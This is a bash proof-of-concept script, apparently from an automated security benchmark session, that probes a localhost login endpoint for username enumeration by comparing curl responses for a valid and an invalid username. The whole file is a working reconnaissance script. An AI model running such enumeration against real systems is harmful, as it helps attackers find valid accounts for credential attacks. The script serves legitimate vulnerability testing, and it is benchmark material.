#!/bin/bash
# POC: Demonstrates user enumeration vulnerability via error message differentiation in login endpoint. Shows how valid and invalid usernames produce different responses allowing username enumeration.
# Target: ./repo
# Created: 2025-11-04T17:32:53.607Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# User Enumeration via Error Message Differentiation POC
# Target: http://localhost:8080/
# Demonstrates how valid usernames receive personalized responses while invalid usernames receive generic errors

TARGET_URL="http://localhost:8080/"
VALID_USER="test"
INVALID_USER="invaliduser12345"

echo "=== User Enumeration POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Valid username
echo "[*] Testing with VALID username: '$VALID_USER'"
echo "Request: POST $TARGET_URL with username=$VALID_USER"
VALID_RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "username=$VALID_USER" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response:"
echo "$VALID_RESPONSE"
echo ""

# Extract and check for personalized greeting or user_id
if echo "$VALID_RESPONSE" | grep -q "Welcome"; then
    echo "[+] FOUND: Personalized welcome message detected"
    GREETING=$(echo "$VALID_RESPONSE" | grep -o "Welcome[^<]*" | head -1)
    echo "    Message: $GREETING"
fi

if echo "$VALID_RESPONSE" | grep -q "user_id"; then
    echo "[+] FOUND: user_id parameter in response (indicates valid user)"
    USER_ID=$(echo "$VALID_RESPONSE" | grep -o "user_id=[^&\"]* \|user_id=[^&\"]*" | head -1)
    echo "    User ID: $USER_ID"
fi

echo ""
echo "---"
echo ""

# Test 2: Invalid username
echo "[*] Testing with INVALID username: '$INVALID_USER'"
echo "Request: POST $TARGET_URL with username=$INVALID_USER"
INVALID_RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "username=$INVALID_USER" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response:"
echo "$INVALID_RESPONSE"
echo ""

# Extract and check for error message
if echo "$INVALID_RESPONSE" | grep -q "User not found"; then
    echo "[+] FOUND: Generic 'User not found' error message detected"
fi

if echo "$INVALID_RESPONSE" | grep -q "alert"; then
    echo "[+] FOUND: Alert message in response (indicates invalid user)"
fi

echo ""
echo "---"
echo ""

# Comparison
echo "[*] VULNERABILITY ANALYSIS:"
echo ""

if echo "$VALID_RESPONSE" | grep -q "Welcome"; then
    echo "[!] VULNERABLE: Valid username displays PERSONALIZED greeting"
else
    echo "[-] Valid username response:"
    echo "$VALID_RESPONSE" | head -5
fi

if echo "$INVALID_RESPONSE" | grep -q "User not found"; then
    echo "[!] VULNERABLE: Invalid username displays GENERIC error 'User not found'"
fi

if [ "$VALID_RESPONSE" != "$INVALID_RESPONSE" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Responses differ significantly"
    echo "    - Valid user: Shows personalized content and/or user_id"
    echo "    - Invalid user: Shows 'User not found' error"
    echo ""
    echo "[+] This allows attackers to enumerate valid usernames by observing response differences"
else
    echo "[-] Responses are identical (no vulnerability detected)"
fi